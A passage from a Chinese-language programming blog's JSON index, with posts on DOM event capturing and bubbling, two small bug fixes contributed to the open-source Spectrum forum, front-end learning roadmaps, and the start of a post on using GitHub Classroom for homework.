1234const $list = document.getElementById('list');$list.addEventListener('click', (e) =&gt; &#123; console.log('click!');&#125;) 而這邊的e裡面就蘊含了許多這次事件的相關參數，其中有一個叫做eventPhase，是一個數字，表示這個事件在哪一個 Phase 觸發。 1234const $list = document.getElementById('list');$list.addEventListener('click', (e) =&gt; &#123; console.log(e.eventPhase);&#125;) eventPhase的定義可以在 DOM specification 裡面找到： 1234// PhaseTypeconst unsigned short CAPTURING_PHASE = 1;const unsigned short AT_TARGET = 2;const unsigned short BUBBLING_PHASE = 3; 這三個階段，就是我們今天的重點。 DOM 的事件在傳播時，會先從根節點開始往下傳遞到target，這邊你如果加上事件的話，就會處於CAPTURING_PHASE，捕獲階段。 target就是你所點擊的那個目標，這時候在target身上所加的eventListenr會是AT_TARGET這一個 Phase。 最後，事件再往上從子節點一路逆向傳回去根節點，這時候就叫做BUBBLING_PHASE，也是大家比較熟知的冒泡階段。 這邊用文字你可能會覺得霧煞煞，我直接引用一張 w3c 講 event flow 的圖，相信大家就清楚了。 你在點擊那一個td的時候，這一個點擊的事件會先從window開始往下傳，一直傳到td為止，到這邊就叫做CAPTURING_PHASE，捕獲階段。 接著事件傳遞到td本身，這時候叫做AT_TARGET。 最後事件會從td一路傳回去window，這時候叫做BUBBLING_PHASE，冒泡階段。 所以，在看一些講事件機制的文章的時候，都會看到一個口訣： 先捕獲，再冒泡 就是這樣來的。 可是，我要怎麼決定我要在捕獲階段還是冒泡階段去監聽這個事件呢？ 其實，一樣是用大家所熟悉的addEventListener，只是這函數其實有第三個參數，true代表把這個 listener 添加到捕獲階段，false或是沒有傳就代表把這個 listener 添加到冒泡階段。 實際演練 大概知道事件的傳遞機制之後，我們拿上面寫好的那一個簡單範例來示範一下，一樣先附上事件傳遞的流程圖（假設我們點擊的對象是#list_item_link） 接著，來試試看幫每一個元素的每一個階段都添加事件，看一看結果跟想像中的是否一樣： 12345678910111213141516171819202122232425262728293031323334const get = (id) =&gt; document.getElementById(id);const $list = get('list');const $list_item = get('list_item');const $list_item_link = get('list_item_link'); // list 的捕獲$list.addEventListener('click', (e) =&gt; &#123; console.log('list capturing', e.eventPhase);&#125;, true) // list 的冒泡$list.addEventListener('click', (e) =&gt; &#123; console.log('list bubbling', e.eventPhase);&#125;, false) // list_item 的捕獲$list_item.addEventListener('click', (e) =&gt; &#123; console.log('list_item capturing', e.eventPhase);&#125;, true) // list_item 的冒泡$list_item.addEventListener('click', (e) =&gt; &#123; console.log('list_item bubbling', e.eventPhase);&#125;, false) // list_item_link 的捕獲$list_item_link.addEventListener('click', (e) =&gt; &#123; console.log('list_item_link capturing', e.eventPhase);&#125;, true) // list_item_link 的冒泡$list_item_link.addEventListener('click', (e) =&gt; &#123; console.log('list_item_link bubbling', e.eventPhase);&#125;, false) 點一下超連結，console 輸出以下結果： 123456789101112list capturing1list_item capturing1list_item_link capturing2list_item_link bubbling2list_item bubbling3list bubbling3 1 是CAPTURING_PHASE，2 是AT_TARGET，3 是BUBBLING_PHASE。 從這邊就可以很明顯看出，事件的確是從最上層一直傳遞到 target，而在這傳遞的過程裡，我們用addEventListenr的第三個參數把 listener 添加在CAPTURING_PHASE。 然後事件傳遞到我們點擊的超連結（a#list_item_link）本身，在這邊無論你使用addEventListener的第三個參數是true還是false，這邊的e.eventPhase都會變成AT_TARGET。 最後，再從 target 不斷冒泡傳回去，先傳到上一層的#list_item，再傳到上上層的#list。 先捕獲，再冒泡的小陷阱 既然是先捕獲，再冒泡，意思就是無論那些addEventListener的順序怎麼變，輸出的東西應該還是會一樣才對。我們把捕獲跟冒泡的順序對調，看一下輸出結果是否一樣。 12345678910111213141516171819202122232425262728293031323334const get = (id) =&gt; document.getElementById(id);const $list = get('list');const $list_item = get('list_item');const $list_item_link = get('list_item_link'); // list 的冒泡$list.addEventListener('click', (e) =&gt; &#123; console.log('list bubbling', e.eventPhase);&#125;, false) // list 的捕獲$list.addEventListener('click', (e) =&gt; &#123; console.log('list capturing', e.eventPhase);&#125;, true) // list_item 的冒泡$list_item.addEventListener('click', (e) =&gt; &#123; console.log('list_item bubbling', e.eventPhase);&#125;, false) // list_item 的捕獲$list_item.addEventListener('click', (e) =&gt; &#123; console.log('list_item capturing', e.eventPhase);&#125;, true) // list_item_link 的冒泡$list_item_link.addEventListener('click', (e) =&gt; &#123; console.log('list_item_link bubbling', e.eventPhase);&#125;, false) // list_item_link 的捕獲$list_item_link.addEventListener('click', (e) =&gt; &#123; console.log('list_item_link capturing', e.eventPhase);&#125;, true) 一樣點擊超連結，輸出的結果是： 123456789101112list capturing1list_item capturing1list_item_link bubbling2list_item_link capturing2list_item bubbling3list bubbling3 可以發現一件神奇的事，那就是list_item_link居然是先執行了添加在冒泡階段的 listener，才執行捕獲階段的 listener。 這是為什麼呢？ 其實剛剛上面有提到，當事件傳遞到點擊的真正對象，也就是 e.target 的時候，無論你使用addEventListener的第三個參數是true還是false，這邊的e.eventPhase都會變成AT_TARGET。 既然這邊已經變成AT_TARGET，自然就沒有什麼捕獲跟冒泡之分，所以執行順序就會根據你addEventListener的順序而定，先添加的先執行，後添加的後執行。 所以，這就是為什麼我們上面把捕獲跟冒泡的順序換了以後，會先出現list_item_link bubbling的原因。 關於這些事件的傳遞順序，只要記住兩個原則就好： 先捕獲，再冒泡 當事件傳到 target 本身，沒有分捕獲跟冒泡 jsbin 範例程式碼 取消事件傳遞 接著要講的是，這一串事件鏈這麼長，一定有方法可以中斷這一條鏈，讓事件的傳遞不再繼續。而這個方法相信大家應該都不陌生，就是：e.stopPropagation。 你加在哪邊，事件的傳遞就斷在哪裡，不會繼續往下傳遞。 例如說以上面那個例子來講，假如我加在#list的捕獲階段： 12345// list 的捕獲$list.addEventListener('click', (e) =&gt; &#123; console.log('list capturing', e.eventPhase); e.stopPropagation();&#125;, true) 這樣子，console 就只會輸出： 12list capturing1 因為事件的傳遞被停止，所以剩下的 listener 都不會再收到任何事件。 不過，在這邊依然有一個地方要特別注意。 這邊指的「事件傳遞被停止」，意思是說不會再把事件傳遞給「下一個節點」，但若是你在同一個節點上有不只一個 listener，還是會被執行到。 例如說： 12345678910// list 的捕獲$list.addEventListener('click', (e) =&gt; &#123; console.log('list capturing'); e.stopPropagation();&#125;, true) // list 的捕獲 2$list.addEventListener('click', (e) =&gt; &#123; console.log('list capturing2');&#125;, true) 輸出結果是： 12list capturinglist capturing2 儘管已經用e.stopPropagation，但對於同一個層級，剩下的 listener 還是會被執行到。 若是你想要讓其他同一層級的 listener 也不要被執行，可以改用e.stopImmediatePropagation(); 例如說： 12345678910// list 的捕獲$list.addEventListener('click', (e) =&gt; &#123; console.log('list capturing'); e.stopImmediatePropagation();&#125;, true) // list 的捕獲 2$list.addEventListener('click', (e) =&gt; &#123; console.log('list capturing2');&#125;, true) 輸出結果是： 1list capturing 取消預設行為 常常有人搞不清楚e.stopPropagation跟e.preventDefault的差別，前者我們剛剛已經說明了，就是取消事件繼續往下傳遞，而後者則是取消瀏覽器的預設行為。 最常見的做法就是阻止超連結，例如說： 1234// list_item_link 的冒泡$list_item_link.addEventListener('click', (e) =&gt; &#123; e.preventDefault();&#125;, false) 這樣子，當點擊超連結的時候，就不會執行原本預設的行為（新開分頁或是跳轉），而是沒有任何事情發生，這就是preventDefault的作用。 所以呢，preventDefault跟 JavaScript 的事件傳遞「一點關係都沒有」，你加上這一行之後，事件還是會繼續往下傳遞。 有一個特別值得注意的地方是 W3C 的文件裡面有寫到： Once preventDefault has been called it will remain in effect throughout the remainder of the event’s propagation. 意思就是說一旦 call 了preventDefault，在之後傳遞下去的事件裡面也會有效果。 我們來看一個範例： 12345// list 的捕獲$list.addEventListener('click', (e) =&gt; &#123; console.log('list capturing', e.eventPhase); e.preventDefault();&#125;, true) 我們在#list的捕獲事件裡面就先寫了e.preventDefault()，而根據文件上面所說的，這個效果會在之後傳遞的事件裡面一直延續。 因此，等之後事件傳遞到#list_item_link的時候，你會發現點超連結一樣沒反應。 實際應用 知道了事件的傳遞機制、取消傳遞事件跟取消預設行為之後，在實際開發上有什麼用處呢？ 最常見的用法其實就是事件代理（Delegation），例如說你今天有一個 ul，底下 1000 個 li，如果你幫每一個 li 都加上一個 eventListener，你就新建了 1000 個 function。 但我們剛剛已經知道，任何點擊 li 的事件其實都會傳到 ul 身上，因此我們可以在 ul 身上掛一個 listener 就好。 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;ul id=\"list\"&gt; &lt;li data-index=\"1\"&gt;1&lt;/li&gt; &lt;li data-index=\"2\"&gt;2&lt;/li&gt; &lt;li data-index=\"3\"&gt;3&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; 123document.getElementById('list').addEventListener('click', (e) =&gt; &#123; console.log(e.target.getAttribute('data-index'));&#125;) 而這樣的好處是當你新增或是刪除一個 li 的時候，不用去處理跟那個元素相關的 listener，因為你的 listener 是放在 ul 身上。這樣透過父節點來處理子節點的事件，就叫做事件代理。 除此之外，我有想到幾個滿有趣的應用，大家可以參考看看。 例如說剛剛提到的e.preventDefault()，既然我們知道原理跟使用技巧，就可以這樣用： 1234window.addEventListener('click', (e) =&gt; &#123; e.preventDefault(); e.stopPropagation();&#125;, true); 只要這樣一段程式碼，就可以把頁面上所有的元素停用，點了都沒有反應，像是&lt;a&gt;點了不會跳出超連結，&lt;form&gt;按了submit也沒用，而且因為阻止事件冒泡，所以其他的onClick事件也都不會執行。 或是，也可以這樣用： 123window.addEventListener('click', (e) =&gt; &#123; console.log(e.target);&#125;, true) 利用事件傳遞機制的特性，在window上面使用捕獲，就能保證一定是第一個被執行的事件，你就可以在這個 function 裡面偵測頁面中每一個元素的點擊，可以傳回去做數據統計及分析。 結論 DOM 的事件傳遞機制算是 JavaScript 眾多經典面試題裡面相對簡單很多的，只要能掌握事件傳遞的原則跟順序，其實就差不多了。 而e.preventDefault與e.stopPropagation的差別在知道事件傳遞順序之後也大概能理解，前者就只是取消預設行為，跟事件傳遞沒有任何關係，後者則是讓事件不再往下傳遞。 希望這篇能讓大家理解 DOM 的事件傳遞機制，如果有哪邊有講錯，也麻煩大家不吝指證，感謝。 參考資料（比較推薦後面那些原文資料）： JavaScript 详说事件机制之冒泡、捕获、传播、委托 Javascript 事件冒泡和捕获的一些探讨 浅谈 javascript 事件取消和阻止冒泡 What Is Event Bubbling in JavaScript? Event Propagation Explained What is event bubbling and capturing? Event order Document Object Model Events","link":"/2017/08/27/dom-event-capture-and-propagation/"},{"title":"記一次幫開源專案 spectrum 修 bug 的經歷","text":"前言 最近又開始了自己的教學計畫，第一期的時候寫了這篇：利用 Github Classroom 加 Travis CI 打造改作業系統，第二期寫了這篇：AWS Lambda + GitHub API + Google Sheet = 自動化簽到系統，都是利用現成工具來快速湊出符合自己需求的系統。 而第三期開始前我希望課程能有個討論區，讓學生們可以在上面很方便地問問題。一直以來都是用 Slack，但 Slack 最大的缺點就是免費版會吃訊息，很多不錯的資訊被洗掉就覺得滿可惜的，希望能有個論壇或是討論區之類的地方會比較好。 在兩年前我也寫過一篇：自架論壇的解決方案：flarum, github issue, nodeBB, discourse，研究了幾套方案，最後選擇 GitHub Issue。因為最簡單、最方便，但最大的缺點是學生好像不太習慣，因為左看右看上看下看其實都不像是個論壇。 前陣子因緣際會之下知道了這一個平台：spectrum，首頁的 slogan 寫得很清楚： The community platform for the future. 去年被 GitHub 買下來之後變成完全免費的，以前付費版的功能也變免費了。在我看來，其實就是「更像討論區」的 Slack。先給大家看一張截圖： 最左邊是不同的 workspace，這跟 Slack 一樣。再來你可以看到各個 Channles，這跟 Slack 也一樣，唯一不同的是右邊，原本 Slack 的訊息變成了一個個討論串，有標題跟內文。 這樣你大概可以懂我在說什麼了，這套跟 Slack 很像，但是更適合當作是討論區。 免費、背後是 GitHub、可以有 private 的論壇、開源，這簡直是完美的解決方案。除了沒有手機 App 以外，其他沒什麼可以挑剔的，就決定是這一套了！ 事情沒有那麼順利… 開始試用幾天之後，發現有一個超級大問題，雖然說在功能上沒什麼問題，但是在體驗上我覺得極差，這一個小缺點就足夠讓我放棄這個平台。 是什麼問題呢？排版。 spectrum 原生支援 Markdown，使用起來十分順手，可是換行卻出了問題。在有些地方只有空行是沒有用的，結尾要加兩個空格才會換行，雖然我覺得這很不方便，但勉強可以接受。 可是！在 spectrum 上面，要兩個換行才會真的換行。 底下是範例，最下面的 line1 跟 line2 應該要換行： 可是 po 文之後卻會變成這樣： 換行變成了空格，如果是英文還好，但如果是中文的話排版就變得超級無敵奇怪，完全不能接受。 心灰意冷的我去了官方討論區發文，想說會不會有什麼其他換行的方法只是我不知道。 結果官方給我的回覆是：「對，現在你只能換行兩次才會真的換行」。 原本槁木死灰的我想說那就乾脆放棄吧，研究看看有沒有其他解法，甚至還一度想說要不要自己寫一套出來，但一想到要支援一大堆功能就覺得很麻煩，遲遲無法下定決心。 經過幾天的深思之後，覺得 spectrum 這個平台真的很好，但唯一的缺點就是排版問題，如果這個缺點解決了，沒道理不用它。 馬特拉不拉，我們自己拉。官方有 bug 沒空修，沒關係，我們自己修！這就是開源的好處。 修 bug 之旅 要幫開源專案修 bug 的第一步很簡單，就是想辦法把整個環境跑起來。你要有辦法在本機跑起來才有辦法驗證自己到底有沒有修成功，所以官方文件是很重要的。 spectrum 的文件很齊全，有一連串的指示告訴你應該要怎麼做。照著做之後，就能把前後端都在自己的 local 跑起來了。 在等待安裝這些套件的途中，可以自己稍微猜一下問題出在哪裡。那時的我猜說應該是 markdown 的編輯器出了什麼問題，可能在把 markdown 轉成 HTML 的時候出了問題，沒有處理好，所以少了換行。 光猜是沒有用的，第一步要縮小問題範圍並且定位問題，先找出最重要的發文這一段到底發生了什麼事情。 在 Chrome 我們可以用 React Devtool，看到發文的介面是一個叫做 composer 的 component。接著在 composer/index.js 裡面可以看到是由一個叫做 Inputs 的元件負責。 在 Inputs.js 裡面發現了一件驚人的事情，原來按下 Preview 的時候，會直接送 request 到一個寫死的路徑並且把結果顯示出來： 12345678910111213141516171819const onClick = (show: boolean) =&gt; &#123; setShowPreview(show); if (show) &#123; setPreviewBody(null); fetch('https://convert.spectrum.chat/from', &#123; method: 'POST', body, &#125;) .then(res =&gt; &#123; if (res.status &lt; 200 || res.status &gt;= 300) throw new Error('Oops, something went wrong'); return res.json(); &#125;) .then(json =&gt; &#123; setPreviewBody(json); &#125;); &#125;&#125;; 既然轉換是 Server 做的，那接下來就要來找找 Server 到底做了什麼。 可是我又不知道https://convert.spectrum.chat/from是對應到 Server 的哪裡，要怎麼找到 Server 是怎麼處理的呢？ 這邊可以換一個想法，雖然說預覽的時候的確是送到這邊沒錯，但是發文的時候 Server 一定也會處理這個格式轉換，所以可以先找出發文的時候 Server 到底做了什麼，應該會有一些線索。 接著在前端發文之後查看 Network tab，因為後端是 GraphQL 所以滿好看的，是一個叫做publushThread的操作。 立刻往 Server 的部分找，循線找到了這個檔案：publishThread.js，並且發現裡面呼叫了一個 processThreadContent 來做轉換。 往下追這個 function，看程式碼之後發現這應該是最底層了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// @flowimport &#123; stateFromMarkdown &#125; from 'draft-js-import-markdown';import &#123; convertFromRaw, convertToRaw, EditorState &#125; from 'draft-js';import &#123; addEmbedsToEditorState &#125; from './add-embeds-to-draft-js'; export default (type: 'TEXT' | 'DRAFTJS', body: ?string): string =&gt; &#123; let newBody = body; if (type === 'TEXT') &#123; // workaround react-mentions bug by replacing @[username] with @username // @see withspectrum/spectrum#4587 newBody = newBody ? newBody.replace(/@\\[([a-z0-9_-]+)\\]/g, '@$1') : ''; newBody = JSON.stringify( convertToRaw( stateFromMarkdown(newBody, &#123; customBlockFn: elem =&gt; &#123; if (elem.nodeName !== 'PRE') return; const code = elem.childNodes.find(node =&gt; node.nodeName === 'CODE'); if (!code) return; const className = code.attributes.find( (&#123; name &#125;) =&gt; name === 'class' ); if (!className) return; const lang = className.value.replace('lang-', ''); return &#123; type: null, data: &#123; language: lang, &#125;, &#125;; &#125;, parserOptions: &#123; atomicImages: true, breaks: true, &#125;, &#125;) ) ); &#125; // Add automatic embeds to body try &#123; return JSON.stringify(addEmbedsToEditorState(JSON.parse(newBody || ''))); // Ignore errors during automatic embed detection &#125; catch (err) &#123; console.error(err); return newBody || ''; &#125;&#125;; 而且沒有看出任何跡象，看起來一切正常。此時的我想說：該不會要往下追到 draft-js 或是其他的 library 吧？ 但是既然都找到這了，應該先來看一下它轉出來會是什麼東西，再決定下一步該怎麼辦，於是我在這個 function 加了 log，把它最後轉換的東西印出來。 我的輸入是： 1234567onelinenewline thirdline fourline fiveline 輸出是： 1234567891011121314151617181920212223242526272829303132&#123; \"blocks\":[ &#123; \"key\":\"bq56i\", \"text\":\"oneline\\nnewline\\nthirdline\", \"type\":\"unstyled\", \"depth\":0, \"inlineStyleRanges\":[], \"entityRanges\":[], \"data\":&#123;&#125; &#125;, &#123; \"key\":\"9h38b\", \"text\":\"fourline\", \"type\":\"unstyled\", \"depth\":0, \"inlineStyleRanges\":[], \"entityRanges\":[], \"data\":&#123;&#125; &#125;, &#123; \"key\":\"fuprm\", \"text\":\"fiveline\", \"type\":\"unstyled\", \"depth\":0, \"inlineStyleRanges\":[], \"entityRanges\":[], \"data\":&#123;&#125; &#125; ], \"entityMap\":&#123;&#125;&#125; 不印則已，一印驚人！ 沒想到上面的測資轉換出來是：&quot;text&quot;:&quot;oneline\\nnewline\\nthirdline&quot;，看來 Server 的轉換完全正常，換行被轉為\\n，兩個換行被轉為一個新的 block，看來問題是出在前端沒有把這個換行好好輸出。 接著再用差不多的方法一樣用 React Devtool 來看，發現前端顯示是 threadDetail.js 在處理，而裡面呼叫了 threadRenderer.js，看來這就是真的 render 的地方了。 找到 threadRenderer.js 之後，發現裡面只是單純地呼叫了 redraft 這個 library。 好，雖然又有新的東西要研究，但離答案愈來愈近了。 仔細看了一下 redraft 的文件，看起來是可以自定義每一個型態最後的輸出要長什麼樣子。往下把官方文件看完，發現有一區是 Common issues ，裡面寫著： Can the multiple spaces between text be persisted? Add white-space: pre-wrap to a parent div, this way it will preserve spaces and wrap to new lines (as editor js does) 看到這邊，答案已經很明顯了，就是前端顯示忘記加 white-space: pre-wrap，所以預設的行為會把換行當作是空格。 真相大白的時候我在心裡暗罵了一聲髒話，但是是罵自己。因為這問題在前端其實滿常見的，我也用過這屬性很多次。可是在我看到這問題的時候我第一點居然是往後端去懷疑，完全沒想到有可能是前端的問題，更沒有想到原來是加一行 CSS 就可以搞定的事。 接著就先發了一個 Issue 記錄了一下調查的過程跟成因，然後發了個 PR，雖然只是改這麼一行而已，但是對我意義重大。因為只要這個 bug 修好，這套就立刻海放其他現成的論壇系統。 他們的速度很快，發 PR 之後隔天就被 merge 了，再隔個一週就被 deploy 到 production 了，真的很有效率。 意猶未盡，再修一個！ 雖然只有一行，但探索的過程獲益良多，而且 PR 能被 merge 就很開心。既然都修了一個，那來找找看有沒有其他容易修的好了，可以一起順手修掉。 在官方的 Issues 翻一翻，找到一個看起來不難的：Weird image failed rendering in thread body，這個 Issue 很簡單，就是不知道為什麼會出現下面的 bug： 文字覆蓋住了後面的圖片。 Issue 裡面有附上原文網址，點進去以後用 devtool 看了一下，發現問題出在當瀏覽器無法載入 img 標籤的圖片時，就會變成這樣。 我之前完全沒碰過這問題，但自己試了一下，發現 img 原本有 margin，可是在圖片沒辦法載入的時候會失效。直覺告訴我這可能是 margin collapsing 有關的問題。 後來我自己試了一下，問題出在當圖片無法載入，img 的高度就會變成 0，然後 margin 就會失效。因為一些排版跟 CSS 的元素，下面的文字就會蓋上來，變成下面的圖片那樣。 那有什麼好解法嗎？ 我發現一個最簡單的解法就是加上 alt 屬性，當圖片無法載入時就會就會顯示這個文字，img 就能保有高度，margin 也能作用。 查到解法之後一樣先回在 Issue 下面跟他們討論，看他們覺得如何。 後來我發現原本上傳圖片時其實就有設定 alt，但可能在一些邊界條件下會是空的，或者是使用者手動把 alt 移除掉。 所以最後的解法也很簡單，就是幫 alt 加一個預設值，PR: Add default alt text to img： 12- &lt;img key=&#123;key&#125; src=&#123;data.src&#125; alt=&#123;data.alt&#125; /&gt;,+ &lt;img key=&#123;key&#125; src=&#123;data.src&#125; alt=&#123;data.alt || &apos;Image&apos;&#125; /&gt; 總結 雖然只有貢獻了兩行，但能看到自己的帳號出現在 release log 上面還是滿開心的： 如果是以前的自己，我絕對不會幹這種事。絕對是發現 bug 之後就停住了，然後等著官方團隊來修 bug。 但這幾年漸漸開始熟悉起看其他人的 code，工作的時候偶爾沒事就可以看一下 redux-form 或是 redux 的 source code 等等，看著看著覺得也沒那麼可怕。而且 GitHub 還有個超好用功能叫做「搜尋」，很多時候直接搜關鍵字就能找到相關的原始碼，節省超級多時間。 在看其他人的專案時，我覺得最難的是定位問題，一但你定位問題之後其他都沒那麼難了，因為你已經知道是哪個檔案、哪段程式碼有問題，接著只要朝那邊去研究就好。至於該怎麼定位問題，有以下幾個建議： 直接搜尋程式碼，看能不能找到相關段落 利用 devtool 找出相關的元件 看文件，看上面有沒有附一些架構 當你要修 bug 的時候，方向是很明確的，沒有必要整個專案都看過，只要找到你要修的地方就好。這一篇希望能分享我的經驗給大家。 最後，當個工程師真好，有開源專案真好，有 bug 都可以自己修掉。","link":"/2019/04/19/fix-spectrum-bug/"},{"title":"從 Redux 作者 Dan Abramov 的文章談前端學習路線圖","text":"前言 前幾天看見 Redux 作者 Dan Abramov 寫的這篇：Things I Don’t Know as of 2018，看了之後其實滿有感觸的，前些日子也在思考這種跟自信相關的事情，也做了個簡單的總結，寫下了兩年過後，我能夠被稱為資深工程師了嗎？。 無獨有偶地，這幾天也看到一些 2019 年更新版的學習路線圖，下面依舊有些留言在說「怎麼前端要學那麼多東西」、「怎麼學的完」、「前端好難啊」等等之類的，雖然這兩件事看似沒有關連，但我覺得其實是相關的。 大神沒有你想像中厲害 常常會看到許多有名的開發者被稱之為大神，既然會被稱作是大神一定有其原因，可能是每年都會在 conference 上面演講、在社群耕耘許久且貢獻良多、寫過一本很厲害的書等等，在這些方面他們的確很厲害，但大神只是個稱號，終究還是個人，他們在那些擅長的領域很厲害沒有錯，可是不用把他們想成什麼都會。 以下節錄自開頭貼的那篇 Dan Abramov 寫的文章： People often assume that I know far more than I actually do. 大家常以為我會的東西很多，但其實沒那麼多 In this post I’ll offer an incomplete list of programming topics that people often wrongly assume that I know. I’m not saying you don’t need to learn them — or that I don’t know other useful things. 這篇文章會列出一些大家以為我會但其實我不會的東西，但我不是說這些東西不需要學，也不是說我不知道其他有用的東西 First, there is often an unrealistic expectation that an experienced engineer knows every technology in their field. Have you seen a “learning roadmap” that consists of a hundred libraries and tools? It’s useful — but intimidating. 首先，大家對大神們總有一些不切實際的幻想，認為他們在各自的領域中什麼都會。你有看過那些列出一大堆工具跟函式庫的學習路線圖嗎？那很有用沒錯，但也很嚇人 （這邊的翻譯只求意思有到，可能會跟原文有些許偏差） 引太多段就沒意思了，建議大家還是先去看完那篇文章，或是看完我這篇再去也可以，總之一定要去看原文。 如果你不知道 Dan Abramov 是誰，這邊簡單介紹一下，他是 Redux 的作者，後來跑去 Facebook 工作，目前是 React 團隊的成員之一，在他的部落格上會發表一些跟 React 相關的小知識或是其他文章，又強又會寫又熱愛分享，是我個人的 role model。 在上面引用的段落中，他想表達的就是大家都以為一個厲害的開發者什麼都會，他就常被大家以為他會的東西超級多，但其實根本沒有到這麼多，接下來他就列了一大堆自己不會的東西： 完全不會用 docker 對網路的理解知道有 IP 位置、DNS 以及有個通訊協定叫做 TCP/IP，就這樣了 不知道 Flexbox 跟 Grid 從來沒學過 SCSS/Sass 從沒設定過 HTTPS / SSL，只知道跟公鑰與私鑰有關 他舉了二十幾個他不會的東西，有些其實跟後端比較有關，所以我挑幾個跟前端比較有關的（除了 docker）出來而已。 舉了這些他不會或是不熟悉的技能，他希望大家看完文章後能理解的事情是： Even your favorite developers may not know many things that you know. 儘管是你很崇拜的開發者，知道的可能還沒有你多（這邊原文 favorite 應該比較像喜愛？但我直覺翻崇拜比較貼近） Regardless of your knowledge level, your confidence can vary greatly. （這句不知道怎麼翻比較好） Experienced developers have valuable expertise despite knowledge gaps. 有經驗的開發者儘管還是有很多不懂的，但至少他在某些領域上是專家 文末提到儘管他講了這麼多，也不會貶低自己的價值或是經驗，因為有其他東西是他擅長的，所以他下一篇就寫自己擅長的東西：The Elements of UI Engineering 這給我的啟示是什麼？ 老實說一開始看到那篇文章我有點嚇到，想說：「哇，原來我會的居然比 Dan 多，至少我用過 docker、我會用 SCSS，我也知道 TCP 的三次握手」，但仔細想想之後發現這句話只對了一半。 對，在 Dan 提出的這些「不擅長」的領域中，我的確懂的比他多，可是這沒辦法推出：「我懂的比他多」，因為在那些他擅長的領域裡面，他有的知識一定屌打我。 例如說對 React 的理解、對開源專案的理解、對 Redux 的理解以及對種種 UI 常見問題的理解，這些絕對都遠遠超過我。 所以結論就是：有什麼好比的呢？ 除了一個人在幾乎所有的領域都比另外一個人厲害以外，似乎也很難說誰懂的比較多。儘管我們把範圍侷限在前端，前端還是包山包海包郵包了一大堆東西，為什麼一定要分出個高下？ 就像我在兩年過後，我能夠被稱為資深工程師了嗎？裡面寫到的，我知道我會很多，但我也知道我不會的很多，每個人都是這樣的。事實上公司也很難找到一個「什麼都會」的人，所以找某個領域的專家比較實在。 你如果讓 Dan 去做那種需要一堆華麗動畫跟特效的網站，還要加上複雜的排版，他可能會做得很差；可是你今天把他放到他擅長的 UI Engineering 的職位，他就能夠做得很出色。 不需要因為自己懂的不多而沒有自信，相反地，你要為了你懂的那些部份而變得有自信。 這跟學習路線圖有什麼關係？ 現在請你打開 Google Map，定位到自己家附近，然後把方圓三公里之內的範圍都仔細看一遍。 好，裡面每一個點、每一間店你都知道、都有印象嗎？ 沒有？沒關係這很正常，因為這是他媽的地圖啊！ 什麼是地圖？地圖就是把所有東西都標示的清清楚楚的，你越 zoom in 之後東西就越詳細，除了在特定時間才會開啟的時空之門以外，其他細節都在地圖上找得到。 可是就算不知道所有的細節，有問題嗎？沒有問題，我還是知道附近哪間店好吃、該到哪裡去買菜、走這條巷子會比外面大馬路快，對周遭的環境我還是瞭若指掌，只是沒有到 100% 的了解而已。 學習路線圖也是差不多的，上面列了一大堆的知識點、一大堆的專有名詞，我自己也是每次看到都頭昏眼花。但就像我上面所說的，它之所以是路線圖就是因為夠完整、夠詳細，幾乎把所有細節都列出來了，才有資格成為路線圖。 事實上你也可以把其他學科列出這種 roadmap，像是數學，從加減乘除、平方小數、根號對數、二元一次方程式再到微積分，最後再到一些我也不知道是什麼的東西。 路線圖最大的功用在哪？在於讓你有個明確的方向以及概念，讓你知道整個前端的領域大概是長這樣，有這些東西可以學；既然是要給這種大方向的東西，那路線圖當然大的不可思議，把能想到的全部都列出來了。 可是你沒必要每一個都會。 如果只是想踏入這個領域，你把 HTML、CSS 跟 JavaScript 搞好其實就行了，頂多再外加個三大框架之一，剩下的那些都可以暫時忽略，等以後再慢慢補起來。 儘管你已經是開發者了想要繼續加強自己的技術，也沒必要把學習路線圖上面的所有東西學起來。前端學不完沒錯，但不只前端學不完，後端也學不完，寫 Android 跟寫 iOS 的也學不完，這本來就是一件很正常的事情，學得完才比較奇怪，就代表這項技術已經停滯不再發展了，不然怎麼可能學完？ 以後看到那些學習路線圖，你要想的不該是：「唉，前端學不完」，就算沒有路線圖你也學不完，你應該要做的是先看看路線圖，知道有哪些東西可以學，再去學你有興趣的那些技術。 看路線圖不是看六法全書，要你研究每個法條甚至背起來，而是跟看地圖一樣，讓你對地理位置有概念，並且幫助你決定要往哪裡走。 結論 學習應該是一件開心的事，我相信 Dan 在解決那些 UI 問題時都很開心，就像我寫每篇技術文章的時候無論花了多少時間、查了多少資料也還是覺得開心。 沒什麼，就因為我熱愛。 最後幫大家做個簡單的條列式總結： 所有領域本來就都學不完，這很正常 挑自己有興趣的部分學，然後成為專家 不要因為自己不會的部份而失去自信，而是要為了自己會的部分產生自信","link":"/2019/01/03/front-end-learning-path/"},{"title":"利用 Github Classroom 加 Travis CI 打造改作業系統","text":"前言 這陣子開始了一個自己的 side project，叫做程式導師實驗計畫，希望能在四個月內把學生培養成找得到工作的工程師。 而 Git 身為工程師的必備技能之一，用 Git 來交作業也是合情合理的一件事，可以先培養學生們對 Git 的熟悉程度。 但問題來了：要怎麼用 Git 交作業？ 之前有開過另外一個前端的課程，那時候我採取的方式是讓學生自己開一個 Github repo 寫作業，並且設置 Github page，所以我可以看到學生的 source code 跟網頁顯示出來的結果。 接著自己設定好 Issue template，要學生寫完作業之後開 issue 提交，如下圖所示： 這樣的好處是我可以把作業都集中在同一個地方管理，可以很方便看出誰交了哪些作業，以及每個作業的狀況： 但缺點也很明顯，那就是身為老師，其實很難「改作業」，意思就是如果我要指正學生們哪邊寫錯了，我只能在 issue 裡面留言，複製它本來的程式碼，然後告訴他怎麼改應該會比較好： 整體來說，其實改作業的體驗還算不錯，沒什麼太大的問題。只是這次既然開始了一個全新的課程，就在想說有沒有更好的方法可以優化這個流程。 新的交作業流程 我在設計課程的時候，都會先思考我在工作上運用了哪些東西，並且把我覺得好的、可以移植的制度搬到課程上，背後的目的是希望先讓學生理解這些東西，日後進入職場時可以無縫接軌。 但有時候我不會跟他們講這是你以後工作時可能會碰到的流程，期待他們真的碰到時驚呼：「哇，原來我在課程裡面做過的練習其實是工作上會用到的東西！」 舉例來說，因為這次新的課程是要求學生每天參與，在我沒有上課的時間自學，剛好公司有在跑 Scrum，每天早上都要開 Stand-up meeting，並且在開始前先在 slack 裡面送出簡短的 note，我就把這個制度引入到課程之中。 1234567*昨天*- 完成 git 安裝- 解 codewar 題目：Opposite number*今天*- 解 codewar 題目：Opposite number- 寫作業：好多星星 